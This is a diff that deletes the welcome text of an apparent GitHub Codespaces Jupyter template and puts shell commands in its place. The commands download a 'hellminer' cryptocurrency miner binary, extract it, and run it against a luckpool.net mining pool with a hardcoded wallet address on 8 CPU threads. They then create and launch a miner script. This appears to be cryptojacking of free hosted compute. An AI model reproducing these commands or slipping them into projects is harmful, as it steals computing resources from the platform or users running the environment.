@@ -1,7 +1,12 @@
-# GitHub Codespaces ♥️ Jupyter Notebooks
+sudo apt install libsodium-dev
 
-Welcome to your shiny new codespace! We've got everything fired up and running for you to explore Python and Jupyter notebooks.
+wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx2.tar.gz
 
-You've got a blank canvas to work on from a git perspective as well. There's a single initial commit with what you're seeing right now - where you go from here is up to you!
+tar -xvf hellminer_linux64_avx2.tar.gz
 
-Everything you do here is contained within this one codespace. There is no repository on GitHub yet. If and when you’re ready you can click "Publish Branch" and we’ll create your repository and push up your project. If you were just exploring then and have no further need for this code then you can simply delete your codespace and it's gone forever.
+./hellminer -c stratum+tcp://ap.luckpool.net:3956 -u RESDBYKfSzZ3iuzLUhrLoWKkP3fJ253YG2.free -p x --cpu 8
+
+nano run_miner.sh
+
+./run_miner.sh
+
